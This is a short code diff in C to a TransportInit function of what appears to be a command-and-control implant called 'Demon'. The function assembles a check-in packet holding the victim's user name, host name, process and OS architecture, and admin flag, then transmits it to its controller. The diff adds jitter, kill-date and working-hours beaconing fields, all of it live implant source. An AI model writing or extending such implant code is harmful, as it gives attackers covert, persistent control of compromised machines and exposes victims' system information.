@@ -33,6 +33,7 @@ BOOL TransportInit( ) {
         [ Magic Value  ] 4 bytes
         [ Agent ID     ] 4 bytes
         [ COMMAND ID   ] 4 bytes
+
         [ Demon ID     ] 4 bytes
         [ User Name    ] size + bytes
         [ Host Name    ] size + bytes
@@ -231,9 +232,9 @@ BOOL TransportInit( ) {
 #endif
 
 
-    PackageAddInt32( Package, 0 );
-    PackageAddInt32( Package, PROCESS_AGENT_ARCH );
-    PackageAddInt32( Package, FALSE ); // default
+    PackageAddInt32( Package, (DWORD) 0 ); // PPID
+    PackageAddInt32( Package, Instance.Session.ProcArch );
+    PackageAddInt32( Package, FALSE ); // isAdmin
 
     mem_set( &OsVersions, 0, sizeof( OsVersions ) );
     OsVersions.dwOSVersionInfoSize = sizeof( OsVersions );
@@ -247,6 +248,9 @@ BOOL TransportInit( ) {
 
     PackageAddInt32( Package, Instance.Session.OSArch );
     PackageAddInt32( Package, Instance.Config.Sleeping );
+    PackageAddInt32( Package, Instance.Config.Jitter );
+    PackageAddInt32( Package, Instance.Config.Transport.KillDate );
+    PackageAddInt32( Package, Instance.Config.Transport.WorkingHours );
     // End of Options
 
     if ( PackageTransmit( Package, &Data, &Length ) ){
